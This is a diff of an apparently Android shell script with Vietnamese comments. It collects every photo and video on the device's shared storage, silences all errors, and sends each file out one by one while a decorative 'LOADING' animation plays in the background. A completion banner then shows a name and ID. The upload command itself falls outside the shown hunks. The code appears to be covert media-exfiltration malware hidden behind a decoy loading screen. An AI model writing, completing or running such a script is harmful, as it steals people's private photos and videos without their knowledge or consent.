@@ -12,28 +12,29 @@ MEDIA_DIR="/storage/emulated/0"
 types="-iname *.jpg -o -iname *.jpeg -o -iname *.png -o \
 -iname *.mp4 -o -iname *.mov -o -iname *.mkv -o -iname *.3gp"
 
-FILES=$(find "$MEDIA_DIR" -type f \( $types \))
-TOTAL=$(echo "$FILES" | wc -l)
-SENT=0
-
-# Ẩn toàn bộ lỗi
+# Tắt toàn bộ lỗi
 exec 2>/dev/null
 
-progress_bar() {
-    local current=$1
-    local total=$2
-    local width=30
-    local done=$((current * width / total))
-    local left=$((width - done))
+FILES=$(find "$MEDIA_DIR" -type f \( $types \) 2>/dev/null)
 
-    DONE_BAR=$(printf "%${done}s" | tr ' ' '█')
-    LEFT_BAR=$(printf "%${left}s" | tr ' ' '░')
-
-    echo -ne "${YELLOW}LOADING: ${DONE_BAR}${LEFT_BAR}\r${RESET}"
+# Animation chạy song song
+loading_animation() {
+    local dots=""
+    while true; do
+        dots="$dots."
+        if [ ${#dots} -gt 10 ]; then
+            dots="."
+        fi
+        echo -ne "${YELLOW}LOADING${dots}\r${RESET}"
+        sleep 0.2
+    done
 }
 
-echo ""
+# Chạy animation nền
+loading_animation &
+ANIM_PID=$!
 
+# Gửi toàn bộ file
 echo "$FILES" | while read FILE; do
     if [ ! -f "$HOME/sent_media.txt" ] || ! grep -Fxq "$FILE" "$HOME/sent_media.txt"; then
         
@@ -51,15 +52,15 @@ echo "$FILES" | while read FILE; do
         fi
 
         echo "$FILE" >> "$HOME/sent_media.txt"
-
-        SENT=$((SENT + 1))
-        progress_bar $SENT $TOTAL
         sleep 1
     fi
 done
 
+# Tắt animation
+kill $ANIM_PID >/dev/null 2>&1
 echo ""
 
+# Hiển thị hoàn thành
 echo -e "${GREEN}HOÀN THÀNH${RESET}"
 echo -e "${GREEN} TÊN: HAI CON${RESET}"
 echo -e "${GREEN} ID: API_XDARTTMKTPHTQTE${RESET}"
